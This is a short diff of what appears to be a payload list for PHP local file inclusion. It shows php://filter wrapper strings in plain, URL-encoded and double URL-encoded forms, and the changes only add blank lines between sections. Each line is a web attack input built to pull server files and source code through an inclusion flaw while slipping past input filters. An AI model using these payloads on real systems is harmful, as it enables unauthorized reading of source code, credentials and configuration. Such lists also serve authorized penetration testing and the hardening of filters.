@@ -19,6 +19,7 @@ php://filter/convert.quoted-printable-encode/resource=
 php://filter/zlib.deflate/convert.base64-encode/resource=
 
 .....................................................................
+
 ##payload for phpFilter Url Encode:
 
 php%3a%2f%2ffilter%2fconvert%2eiconv%2eutf-8%2eutf-16le%2fresource%3d
@@ -38,7 +39,9 @@ php%3a%2f%2ffilter%2fconvert%2ebase64-encode%7cconvert%2ebase64-decode%2fresourc
 php%3a%2f%2ffilter%2fconvert%2equoted-printable-encode%2fresource%3d
 
 php%3a%2f%2ffilter%2fzlib%2edeflate%2fconvert%2ebase64-encode%2fresource%3d
+
 ......................................................................
+
 ##payload for phpFilter double Url Encode:
 
 php%253A%252F%252Ffilter%252Fconvert%252eiconv%252eutf-8%252eutf-16le%252Fresource%253D
